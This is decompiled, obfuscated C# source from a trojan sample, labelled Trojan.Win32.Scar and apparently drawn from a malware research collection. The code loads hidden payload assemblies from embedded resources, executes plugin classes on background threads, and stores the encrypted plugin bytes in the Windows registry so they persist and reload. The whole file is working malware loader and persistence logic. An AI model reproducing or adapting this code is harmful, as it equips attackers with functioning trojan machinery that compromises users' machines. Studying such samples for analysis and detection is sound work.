// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.ᢵඖ೦ܥੜᤳႫ
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using Microsoft.Win32;
using Plugin;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  public class ᢵඖ೦ܥੜᤳႫ
  {
    public static SortedList<Guid, byte[]> \u1ACF١ޟŽˋٙᗣݲบẕᦤ = new SortedList<Guid, byte[]>();
    public static SortedList<Guid, IPlugin> Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ = new SortedList<Guid, IPlugin>();
    private static string ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = string.Empty;

    public static event ᢵඖ೦ܥੜᤳႫ.ᝩǱཱྀᮋࣶΑ\u02F7ڹT PluginAdded;

    public static void \u0870अᒵ\u171DĉᏚᐯ᭮\u1B6Aᅙሩ\u007BȗἸѹᎦᏭ()
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream serializationStream = new MemoryStream();
        binaryFormatter.Serialize((Stream) serializationStream, (object) ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ);
        serializationStream.Close();
        byte[] numArray = ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.\u1B43ྔᏃጄᷰ\u192Cםஉᥢᕟሽ(serializationStream.ToArray(), false);
        if (ᥘĘᛢᛅкPӝ\u0885၁.\u0DFDᅖᰕஉ\u00B1ሩિ == RegistryHive.CurrentUser)
          Registry.CurrentUser.CreateSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ).SetValue(ᥘĘᛢᛅкPӝ\u0885၁.ᑑྵଲᘍឦ᷈ᗻᆝ\u0028\u0A49\u0F06ʙ, (object) numArray);
        else
          Registry.LocalMachine.CreateSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ).SetValue(ᥘĘᛢᛅкPӝ\u0885၁.ᑑྵଲᘍឦ᷈ᗻᆝ\u0028\u0A49\u0F06ʙ, (object) numArray);
      }
      catch
      {
      }
    }

    public static void ᐧᥝ\u1738పᛳᰛ\u1C91\u0CDDǕಉᤶĵ\u109E\u089Bᓸბ\u1BFB໖ᓀ() => new Thread((ThreadStart) (() =>
    {
      try
      {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream;
        byte[] numArray1;
        if (ᥘĘᛢᛅкPӝ\u0885၁.\u0DFDᅖᰕஉ\u00B1ሩિ == RegistryHive.CurrentUser)
        {
          MemoryStream serializationStream = new MemoryStream(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.ᘞϷ\u0AF7ᨡᴰ\u1774ੋ\u0BACߓᕲ\u008FẲУ͔ȴڊਸ਼\u0B5B(Registry.CurrentUser.CreateSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ).GetValue(ᥘĘᛢᛅкPӝ\u0885၁.ᑑྵଲᘍឦ᷈ᗻᆝ\u0028\u0A49\u0F06ʙ) as byte[], false));
          ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        else
        {
          MemoryStream serializationStream = new MemoryStream(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.ᘞϷ\u0AF7ᨡᴰ\u1774ੋ\u0BACߓᕲ\u008FẲУ͔ȴڊਸ਼\u0B5B(Registry.LocalMachine.CreateSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ).GetValue(ᥘĘᛢᛅкPӝ\u0885၁.ᑑྵଲᘍឦ᷈ᗻᆝ\u0028\u0A49\u0F06ʙ) as byte[], false));
          ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ = binaryFormatter.Deserialize((Stream) serializationStream) as SortedList<Guid, byte[]>;
          serializationStream.Close();
          serializationStream.Dispose();
          memoryStream = (MemoryStream) null;
          numArray1 = (byte[]) null;
        }
        foreach (byte[] numArray2 in (IEnumerable<byte[]>) ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ.Values)
          ᢵඖ೦ܥੜᤳႫ.لĴ௪Ⴔ\u09DBᥩᑗቍେǅ(numArray2);
      }
      catch
      {
      }
    })).Start();

    public static void \u0882ᔭࡊޝᙔܔஹঘתྫफ़๕ᦗԔಟ\u17F5() => new Thread((ThreadStart) (() =>
    {
      try
      {
        if (Assembly.GetExecutingAssembly().GetManifestResourceNames().Length == 0)
          return;
        ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
        int num = (int) resourceManager.GetObject("Len");
        for (int index = 0; index < num; ++index)
        {
          byte[] numArray = (byte[]) resourceManager.GetObject(index.ToString());
          Array.Reverse((Array) numArray);
          ᢵඖ೦ܥੜᤳႫ.لĴ௪Ⴔ\u09DBᥩᑗቍେǅ(numArray);
        }
        if (!ᥘĘᛢᛅкPӝ\u0885၁.க\u1A1E᱘Ḥᔓ\u1A9EዠɫຽཾጏឬŰᙦಋπŽಣ)
          return;
        ᢵඖ೦ܥੜᤳႫ.\u0870अᒵ\u171DĉᏚᐯ᭮\u1B6Aᅙሩ\u007BȗἸѹᎦᏭ();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    })).Start();

    public static bool لĴ௪Ⴔ\u09DBᥩᑗቍେǅ(byte[] _param0)
    {
      try
      {
        foreach (Type type in Assembly.Load(_param0).GetTypes())
        {
          int num = 0;
          if (type.IsClass && type.IsSubclassOf(typeof (IPlugin)))
          {
            IPlugin instance = (IPlugin) Activator.CreateInstance(type);
            if (instance.ExecuteOnLoad)
            {
              instance.Initialize();
              ᢵඖ೦ܥੜᤳႫ.ឳམఀ\u1BF7ᤰőṔỉ\u128E\u02F3\u0013ݍ((object) null, instance, instance.ExecuteOnLoadArgs);
            }
            if (!ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ.ContainsKey(instance.Guid))
              ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ.Add(instance.Guid, _param0);
            else
              ++num;
            if (!ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.ContainsKey(instance.Guid))
              ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.Add(instance.Guid, instance);
            else
              ++num;
            ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = string.Empty;
            if (num == 2)
            {
              ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = instance.Name + ": Already Stored";
              return false;
            }
            if (ᢵඖ೦ܥੜᤳႫ.\u19DD\u19DE\u19FAᇎᬔ\u1CB4ྐᴩ\u0BE0\u0709\u17F2߱ӎ != null)
              ᢵඖ೦ܥੜᤳႫ.\u19DD\u19DE\u19FAᇎᬔ\u1CB4ྐᴩ\u0BE0\u0709\u17F2߱ӎ((object) null, instance);
            return true;
          }
        }
        ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = "Class with IPlugin interface not found...";
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = ex.Message;
      }
      return false;
    }

    public static bool \u1A8Fপძʟ\u0BF9ກ\u0BF6ᯓপ\u0D5Cᬺಷ(IPlugin _param0)
    {
      if (!ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.ContainsKey(_param0.Guid))
      {
        ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.Add(_param0.Guid, _param0);
        ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = string.Empty;
        if (ᢵඖ೦ܥੜᤳႫ.\u19DD\u19DE\u19FAᇎᬔ\u1CB4ྐᴩ\u0BE0\u0709\u17F2߱ӎ != null)
          ᢵඖ೦ܥੜᤳႫ.\u19DD\u19DE\u19FAᇎᬔ\u1CB4ྐᴩ\u0BE0\u0709\u17F2߱ӎ((object) null, _param0);
        return true;
      }
      ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ = _param0.Name + ": Already Stored";
      return false;
    }

    public static void ҏಮᏕ᪃ٶጟ(Guid _param0)
    {
      if (!ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.ContainsKey(_param0))
        return;
      ᢵඖ೦ܥੜᤳႫ.\u1ACF١ޟŽˋٙᗣݲบẕᦤ.Remove(_param0);
      ᢵඖ೦ܥੜᤳႫ.Տඤඬྔᵒᑦӿᵕ\u0D53ǒ\u1C3Eᣊٽ.Remove(_param0);
    }

    public static string لᕪЅ\u181Dሪ߫ᯋஐ() => ᢵඖ೦ܥੜᤳႫ.ľլሐ\u0AF0ᇜᤒŪጭᏮᄖƷڞỲ\u0086ᯮተை\u1AA4ᝩ;

    public static void ឳམఀ\u1BF7ᤰőṔỉ\u128E\u02F3\u0013ݍ(
      object _param0,
      IPlugin _param1,
      PluginArgs _param2)
    {
      new Thread((ThreadStart) (() =>
      {
        try
        {
          _param1.Execute(_param0, _param2);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
      })).Start();
    }

    public delegate void ᝩǱཱྀᮋࣶΑ\u02F7ڹT(object _param1, IPlugin ūᨣᕉƟťᴿٖ);
  }
}
